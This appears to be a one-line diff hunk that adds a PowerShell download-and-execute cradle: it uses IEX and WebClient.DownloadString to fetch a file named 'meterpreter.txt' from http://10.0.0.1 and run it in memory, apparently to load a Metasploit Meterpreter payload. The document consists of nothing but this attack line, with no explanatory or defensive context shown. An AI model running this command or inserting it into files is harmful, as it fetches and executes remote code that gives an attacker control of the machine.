@@ -1,0 +1,1 @@
+powershell.exe "IEX ((new-object net.webclient).downloadstring('http://10.0.0.1/meterpreter.txt'))"
